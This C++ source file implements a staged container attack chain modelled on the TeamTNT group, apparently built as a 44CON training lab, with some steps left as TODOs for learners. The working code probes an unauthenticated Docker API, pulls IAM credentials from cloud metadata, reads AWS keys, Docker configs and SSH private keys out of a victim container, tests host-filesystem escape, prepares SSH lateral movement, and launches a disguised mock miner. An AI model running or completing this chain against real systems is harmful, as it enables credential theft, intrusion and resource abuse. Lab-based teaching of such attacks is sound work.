#include "attack_steps.hpp"

#include "log.hpp"
#include "net_scanner.hpp"
#include "util.hpp"

#include <chrono>
#include <dirent.h>
#include <fstream>
#include <sstream>
#include <sys/stat.h>
#include <unistd.h>

namespace teamtnt {

AttackChain::AttackChain(Config cfg)
    : cfg_(std::move(cfg)), docker_(cfg_.docker_base_url()) {
  if (!cfg_.lab_mode) die("Set TEAMTNT_LAB=1 or run inside the attacker container.");
  ensure_dir(cfg_.staging_dir);
}

std::filesystem::path AttackChain::staging(const std::string& name) const {
  return std::filesystem::path(cfg_.staging_dir) / name;
}

void AttackChain::run_all() const {
  log("==============================================");
  log(" TeamTNT Native Attack Chain — 44CON Lab");
  log("==============================================");
  step01_scan();
  step02_probe_docker();
  step03_harvest_credentials();
  step04_container_discovery();
  step05_escape_and_deploy();
  step06_lateral_movement();
  step07_mock_miner();
  log("==============================================");
  log(" Chain complete. Staging: " + cfg_.staging_dir);
  log("==============================================");
}

void AttackChain::step01_scan() const {
  log(">>> Step 01 — scan targets (T1595 / T1046)");
  const std::vector<ScanTarget> targets = {
      // TODO: add scan targets here, as objects of `ScanTarget` structure (ref: include/net_scanner.hpp)
  };

  const auto results = scan_targets(targets);
  std::ostringstream out;
  const auto now = std::chrono::system_clock::now().time_since_epoch().count();
  for (const auto& r : results) {
    out << "open tcp " << r.port << ' ' << r.ip << ' ' << now << '\n';
    log("  OPEN " + r.host + " (" + r.ip + "):" + std::to_string(r.port));
  }
  write_file(staging("scan-results.txt"), out.str());
  if (results.empty()) warn("No open ports — is the lab running?");
}

void AttackChain::step02_probe_docker() const {
  log(">>> Step 02 — probe Docker API (T1133 / T1613)");
  log("Probing Docker API at " + cfg_.docker_base_url());
  if (!docker_.ping()) die("Docker API unreachable — is the lab running?");

  // TODO: get list of docker containers running
  std::ostringstream ps;
  ps << "ID\tIMAGE\tSTATUS\tNAMES\n";
  // TODO: put container information into string stream
  write_file(staging("docker-ps.txt"), ps.str());

  const auto ver = docker_.version();
  write_file(staging("docker-info.txt"), ver.dump(2));
  log("Docker API is unauthenticated — initial access confirmed.");
}

void AttackChain::step03_harvest_credentials() const {
  log(">>> Step 03 — harvest credentials (T1552 / T1083)");
  std::ostringstream creds;
  creds << "=== METADATA ===\n";

  const auto meta_list = http_.get(cfg_.metadata_url + "/iam/security-credentials/");
  if (meta_list.ok()) creds << meta_list.body << '\n';

  const auto meta_role = http_.get(cfg_.metadata_url + "/iam/security-credentials/lab-role");
  if (meta_role.ok()) creds << meta_role.body << '\n';

  creds << "=== /proc environ ===\n";
  // TODO: iterate over /proc, and find creds in process specific environment variables

  log("Harvesting victim files via Docker API (T1552.001 / T1552.004)");
  const std::string victim_id = docker_.find_container_by_name("victim-app");
  if (!victim_id.empty()) {
    creds << "=== victim files ===\n";
    creds << docker_.exec_output(victim_id, {"cat", "/home/devops/.aws/credentials"}) << '\n';
    creds << docker_.exec_output(victim_id, {"cat", "/home/devops/.docker/config.json"}) << '\n';
    creds << docker_.exec_output(victim_id, {"cat", "/home/devops/.ssh/id_rsa"}) << '\n';
    creds << docker_.exec_output(victim_id, {"cat", "/home/devops/.lab_ssh_creds"}) << '\n';
  } else {
    warn("Victim container not found; skipping file harvest");
  }

  write_file(staging("harvested-creds.txt"), creds.str());
  log("Credentials staged at " + staging("harvested-creds.txt").string());
}

void AttackChain::step04_container_discovery() const {
  log(">>> Step 04 — container discovery (T1613 / T1610)");
  write_file(staging("containers-full.txt"), docker_.list_containers(true).dump(2));
  write_file(staging("images.txt"), docker_.list_images().dump(2));

  log("Pull and run public image (T1204.003)");
  // TODO: download and run container image

  const auto containers = docker_.list_containers(false);
  if (containers.is_array() && !containers.empty()) {
    const std::string id = containers[0]["Id"].get<std::string>();
    write_file(staging("inspect-sample.json"), docker_.inspect_container(id).dump(2));
  }
  log("Discovery complete.");
}

void AttackChain::step05_escape_and_deploy() const {
  log(">>> Step 05 — escape and deploy (T1611 / T1105)");
  // TODO: run container, and access host filesystem

  const std::string id = "";
  std::ostringstream escape_out;
  if (!id.empty()) {
    escape_out << docker_.exec_output(id, {"sh", "-c",
                                           "echo '[escape] Host root visible at /host'; "
                                           "ls /host/etc/hostname; cat /host/etc/hostname; "
                                           "ls -la /host/var/run/docker.sock 2>/dev/null || echo no docker.sock"});
  }
  write_file(staging("escape-output.txt"), escape_out.str());

  log("Ingress tool transfer (T1105)");
  // TODO: download a file
  log("Escape lab container: teamtnt-escape-lab");
}

void AttackChain::step06_lateral_movement() const {
  log(">>> Step 06 — lateral movement (T1021.004 / T1078.004)");
  const auto creds_path = staging("harvested-creds.txt");
  const auto key_path = staging("id_rsa");
  const std::string creds = read_file(creds_path);
  const std::string key = extract_ssh_key(creds);
  const std::string password = extract_ssh_password(creds);
  const std::string target = cfg_.ssh_lateral_target;

  if (!key.empty()) {
    // TODO: Run commands on remote host using SSH key based authentication
  } else {
    warn("No SSH key in harvest; skipping key-based lateral");
  }

  if (!password.empty()) {
    // TODO: Run command on remote host using SSH (username/password)
  } else {
    warn("No SSH password in harvest; skipping password-based lateral");
  }

  if (creds.find("AKIA") != std::string::npos) {
    write_file(staging("aws-identity.txt"), "Harvested AWS key present — would run aws sts get-caller-identity\n");
  } else {
    write_file(staging("aws-identity.txt"), "aws cli not available or no keys harvested\n");
  }
  log("Lateral movement artifacts in " + cfg_.staging_dir);
}

void AttackChain::step07_mock_miner() const {
  log(">>> Step 07 — mock miner (T1496.001)");
  nlohmann::json spec;
  spec["Image"] = "busybox:1.36";
  spec["Cmd"] = nlohmann::json::array(
      {"sh", "-c",
       "while true; do dd if=/dev/zero of=/dev/null bs=1M count=2 2>/dev/null; sleep 1; done"});
  spec["HostConfig"]["NanoCpus"] = 250000000;

  const std::string id = docker_.run_container("k8s-guardian-miner", spec);
  if (!id.empty()) {
    log("Miner container started: k8s-guardian-miner");
  } else {
    warn("Miner deployment failed");
  }
}

}  // namespace teamtnt
